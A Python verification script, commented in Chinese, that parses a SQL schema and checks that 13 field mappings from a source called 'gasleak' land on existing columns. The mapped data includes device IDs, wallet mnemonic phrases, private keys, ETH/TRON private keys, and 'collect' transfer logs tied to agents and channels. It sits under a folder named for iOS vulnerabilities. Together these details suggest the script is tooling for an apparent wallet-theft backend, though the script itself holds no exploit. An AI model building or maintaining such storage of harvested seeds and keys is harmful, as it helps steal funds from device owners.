"""
P1-4 验收脚本：逐条核对 §3.6.1 的 13 条字段映射。

对每条映射，检查其「潜客目标列」是否真实存在于 qianke0301.sql 的 DDL 中。
原表 4 条错列应报 FAIL；修正后的列应报 OK。

运行：
    $env:PYTHONIOENCODING='utf-8'
    python _integration\\_fix_work\\verify_field_mapping.py
"""
# ★ X3：本脚本【自带】UTF-8 输出，不依赖调用方设置 PYTHONIOENCODING（P-10）
import os as _os
IOS_ROOT = _os.environ.get("IOS_ROOT", r"E:\ios漏洞")
QIANKE_SRC = _os.environ.get("QIANKE_SRC", r"E:\潜客")
import os as _os
import sys as _sys

_os.environ.setdefault("PYTHONIOENCODING", "utf-8")
try:
    _sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    _sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass  # 旧版 Python 无 reconfigure 时静默降级
import os
import re
import sys

SQL = QIANKE_SRC + r'\qianke\qianke0301.sql'

if not os.path.isfile(SQL):
    print('SQL 不存在:', SQL)
    sys.exit(2)

src = open(SQL, encoding='utf-8', errors='replace').read()


def columns(table):
    """返回某表在 DDL 中的列名集合。"""
    m = re.search(r'CREATE TABLE\s+`%s`\s*\(' % re.escape(table), src, re.I)
    if not m:
        return set()
    i = src.index('(', m.start())
    depth = 0
    for j in range(i, len(src)):
        if src[j] == '(':
            depth += 1
        elif src[j] == ')':
            depth -= 1
            if depth == 0:
                end = j
                break
    body = src[i:end + 1]
    return set(re.findall(r'^\s*`([a-z_0-9]+)`', body, re.M))


# 潜客侧三张主表的真实列
COLS = {t: columns(t) for t in ['machine', 'wallet', 'bill', 'packet', 'agent']}

print('=' * 74)
print('潜客 DDL 实测列')
print('=' * 74)
for t, cs in COLS.items():
    print('%-10s (%2d): %s' % (t, len(cs), ', '.join(sorted(cs))))
print()

# (编号, 描述, 目标表, 目标列, 原方案声称的列)
CASES = [
    (1,  'Device.uniqueId',                'machine', 'device_id',        'device_id'),
    (2,  'Device.channelCode',             'machine', 'agent_id',         'agent_id'),
    (3,  'Device.productType',             'machine', 'model',            'model'),
    (4,  'Device.iosVersion',              None,      None,               None),
    (5,  'Device.firstSeen',               'machine', 'create_time',      'created_at'),
    (6,  'WalletData.walletType',          'wallet',  'wallet_name',      'wallet_name'),
    (7,  'WalletData.data(phrase)',        'wallet',  'phrase',           'phrase'),
    (7,  'WalletData.data(privkey)',       'wallet',  'private_key',      'key'),
    (8,  'Mnemonic.content',               'wallet',  'phrase',           'phrase'),
    (9,  'DerivedAddress.address(eth)',    'wallet',  'eth_address',      'address'),
    (9,  'DerivedAddress.address(tron)',   'wallet',  'trx_address',      'address'),
    (10, 'DerivedAddress.privateKey(eth)', 'wallet',  'eth_private_key',  'private_key'),
    (10, 'DerivedAddress.privateKey(tron)','wallet',  'trx_private_key',  'private_key'),
    (11, 'CollectLog.txHash',              'bill',    'transfer_hash',    'transfer_hash'),
    (12, 'CollectLog.amount',              'bill',    'num',              'amount'),
    (13, 'Channel.code',                   'packet',  'group_id',         'group_id'),
]

print('=' * 74)
print('逐条核对（目标列是否存在于真实 DDL）')
print('=' * 74)
print('%-4s %-34s %-22s %-10s %s' % ('#', 'gasleak 字段', '潜客目标列', '判定', '原表声称'))
print('-' * 100)

fails = 0
orig_bad = 0
for num, desc, tbl, col, claimed in CASES:
    if tbl is None:
        verdict = 'N/A(待扩展)'
        note = '—'
    else:
        exists = col in COLS[tbl]
        verdict = 'OK' if exists else 'FAIL'
        if not exists:
            fails += 1
        # 原方案声称的列是否存在
        if claimed and claimed != col:
            note = '%s (%s)' % (claimed, '存在' if claimed in COLS[tbl] else '★不存在')
            if claimed not in COLS[tbl]:
                orig_bad += 1
        else:
            note = claimed or '—'
    print('%-4s %-34s %-22s %-10s %s'
          % (num, desc, col or '—', verdict, note))

print()
print('=' * 74)
print('汇总')
print('=' * 74)
print('修正后目标列不存在数 : %d   （期望 0）' % fails)
print('原表声称列不存在数   : %d   （期望 4：第 5/7/9/12 条）' % orig_bad)
print()
if fails == 0:
    print('✓ 修正后 13 条映射的目标列全部真实存在')
else:
    print('✗ 仍有 %d 条目标列不存在' % fails)
    sys.exit(1)
